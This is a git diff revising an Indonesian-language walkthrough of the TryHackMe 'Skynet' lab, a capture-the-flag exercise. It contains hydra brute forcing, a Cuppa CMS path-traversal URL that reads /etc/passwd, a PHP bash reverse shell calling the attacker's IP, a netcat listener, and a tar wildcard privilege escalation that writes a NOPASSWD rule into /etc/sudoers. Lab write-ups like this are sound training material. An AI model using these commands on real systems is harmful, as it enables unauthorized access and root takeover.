@@ -8,7 +8,6 @@
 nmap -sV -A <IP Machine>
 ```
 - Berikut adalah hasil dari port scanning
-
 ```sh
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sC -sV -A 10.10.66.97
@@ -117,7 +116,8 @@ gobuster dir -u http://<IP Machine> -w /usr/share/wordlists/dirbuster/directory-
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%208.JPG)
 
 ## Exploit
-- Lakukan Inspek Element lalu pindah tab **Network** dan lakukan percobaan login
+- Karena sebelumnya kita menemukan file wordlist **log1.txt** maka kemungkinan kita bisa melakukan bruteforce untuk menemukan password dari user `milesdyson` untuk login ke squirrelmail 
+- Lakukan Inspek Element lalu pindah tab **Network** dan lakukan percobaan login. Percobaan ini dilakukan untuk menemukan path login dan respon jika login gagal yang akan digunakan untuk melakukan bruteforce
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%209.JPG)
 
@@ -128,69 +128,93 @@ hydra -l milesdyson -P log1.txt <IP Machine> http-form-post '/squirrelmail/src/r
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2010.JPG)
 
-- Gunakan username dan password yang sudah ditemukan untuk login ke squirrelmail
+- Password berhasil ditemukan, sekarang gunakan username dan password tersebut untuk login ke squirrelmail
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2011.JPG)
 
-- Buka email yang memiliki Subject **Samba Password reset** dan copy password tersebut
+- Buka email yang memiliki Subject **Samba Password reset**. Di email ini ditemukan password untuk mengakses share SMB user `milesdyson`
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2012.JPG)
 
-- Gunakan password tersebut untuk mengakses SMB Server dengan user **milesdyson** dengan perintah `smbclient -U milesdyson \\\\10.10.66.97\\milesdyson` lalu paste password sebelumnya
+- Akses share SMB user `milesdyson` lalu masukkan password yang sudah ditemukan diatas
+```sh
+smbclient -U milesdyson \\\\IP_Machine\\milesdyson
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2013.JPG)
 
-- Pindah ke folder **notes** dan download file **important.txt**
+- Di dalamnya terdapat folder **notes** lalu di dalam folder **notes** terdapat file **important.txt**. Download file tersebut ke local 
+```sh
+cd notes
+get important.txt
+quit
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2014.JPG)
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2015.JPG)
 
-- Berikut ini adalah isi file **important.txt**
+- Berikut ini adalah isi file **important.txt**, di dalam isi file tersebut terdapat informasi path halaman **/45kra24zxs28v3yd** yang dibuat dengan CMS
+```sh
+cat important.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2016.JPG)
 
-- Buka halaman **/45kra24zxs28v3yd** di browser dengan url `http://<IP_Machine>/45kra24zxs28v3yd`
+- Buka halaman **/45kra24zxs28v3yd** di browser dengan URL `http://<IP_Machine>/45kra24zxs28v3yd`. Di halaman ini kita tidak menemukan halaman yang dibuat dengan CMS sehingga kita perlu menemukan halaman tersembunyi dengan path ini
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2017.JPG)
 
-- Gunakan gobuster untuk mencari halaman tersembunyi dengan perintah `gobuster dir -u http://<IP_Machine>/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
+- Gunakan tool `gobuster` untuk menemukan halaman web tersembunyi
+```sh
+gobuster dir -u http://<IP_Machine>/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2018.JPG)
 
-- Ditemukan halaman **/administrator** dari report gobuster. Buka halaman `http://<IP_Machine>/administrator` di browser, maka tampil halaman login **Cuppa CMS**
+- Ditemukan halaman **/administrator** dari report gobuster. Buka halaman `http://<IP_Machine>/45kra24zxs28v3yd/administrator` di browser, maka tampil halaman login **Cuppa CMS**
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2019.JPG)
 
-- Kita tidak bisa menggunakan default login dan password yang sudah ditemukan sebelumnya, sehingga kita perlu mencari cara mengeksploitasi celah keamanan Cuppa CMS dengan tool searchploit sebagai berikut
+- Kita tidak bisa menggunakan default login dan password yang sudah ditemukan sebelumnya, sehingga kita perlu mencari informasi cara mengeksploitasi celah keamanan Cuppa CMS dengan tool `searchsploit`
+```sh
+searchsploit cuppa
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2020.JPG)
 
-- Dari file yang ada, diketahui bahwa celah keamanan Cuppa CMS adalah remote file inclusion
+- Dari informasi diatas, diketahui bahwa celah keamanan Cuppa CMS adalah local/remote file inclusion. Informasi mengenai celah keamanan tersebut sudah tersimpan di dalam sebuah file di kali linux. Sekarang kita buka isi file tersebut
+```sh
+cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2021.JPG)
 
-- Buka file **/etc/passwd** yang terdapat di server dengan url `http://<IP_Machine>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
+- Sekarang kita coba buka file **/etc/passwd** yang terdapat diserver dengan memanfaatkan celah keamanan local file inclusion yang terdapat di cuppa CMS dengan URL `http://<IP_Machine>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2022.JPG)
 
+- Uji coba celah keamanan local file inclusion berhasil dilakukan. Sekarang kita coba jalankan script reverse shell dengan memanfaatkan celah keamanan remote file inclusion di cuppa CMS 
 - Buat sebuah reverse shell PHP dengan kode sebagai berikut dan simpan dengan nama **php-shell.php**
 ```sh
 <?php
-	exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP tun0>/4444 0>&1'");
+	exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP tun0>/<port> 0>&1'");
 ?>
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2023.JPG)
 
-- Serve shell PHP dengan python
+- Serve file **php-shell.php** dengan python
 ```sh
 python3 -m http.server 80
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2024.JPG)
 
-- Buat sebuah listener netcat di terminal baru dengan perintah `nc -lnvp <port>`
+- Buat sebuah listener netcat di terminal baru
+```sh
+nc -lnvp <port>
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2025.JPG)
 
@@ -206,6 +230,10 @@ http://<IP_Machine>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?u
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2027.JPG)
 
 - Pindah ke directory **/home** disana terdapat directory **milesdyson**, didalam directory **milesdyson** terdapat file **user.txt** sebagai user flag
+```sh
+cd /home/milesdyson
+cat user.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2028.JPG)
 
@@ -217,17 +245,24 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2029.JPG)
 
-- Lihat file crontab untuk melihat daftar program yang terjadwal dengan perintah `cat /etc/crontab` dan disana terdapat file **backup.sh** yang berjalan setiap 1 menit
+- Lihat file crontab untuk melihat daftar program yang terjadwal. Disana terdapat file **backup.sh** yang berjalan setiap 1 menit
+```sh
+cat /etc/crontab
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2030.JPG)
 
 - Isi file **backup.sh** adalah sebagai berikut
+```sh
+cd /home/milesdyson/backups
+cat backup.sh
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2031.JPG)
 
-- Skrip diatas berpindah ke directori **/var/www/html** kemudian menggunakan tool tar untuk mengkompresi menjadi file **backup.tgz** di directory **/home/milesdyson/backups**
-- Kita memanfaatkan script di https://gtfobins.github.io/gtfobins/tar/ untuk melakukan privilege escalation lewat program tar
-- Eksekusi perintah per baris berikut ini
+- Skrip diatas isinya adalah memindahkan posisi directory ke **/var/www/html** kemudian menggunakan tool tar untuk mengkompresi semua file menjadi file **backup.tgz** lalu disimpan directory **/home/milesdyson/backups**
+- Kita memanfaatkan script di https://gtfobins.github.io/gtfobins/tar/ untuk melakukan privilege escalation lewat tool tar
+- Jalankan satu per satu perintah dibawah ini
 ```sh
 cd /var/www/html
 echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
@@ -237,11 +272,17 @@ touch "/var/www/html/--checkpoint=1"
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2032.JPG)
 
-- Tunggu setidaknya 1 menit untuk mendapatkan akses root dengan perintah `sudo su`
+- Tunggu setidaknya 1 menit lalu masuk ke user root
+```sh
+sudo su
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2033.JPG)
 
-- Buka root flag yang berada di **/root/root.txt** dengan perintah `cat /root/root.txt`
+- Buka root flag yang berada di di direktori **/root**
+```sh
+cat /root/root.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2034.JPG)
 
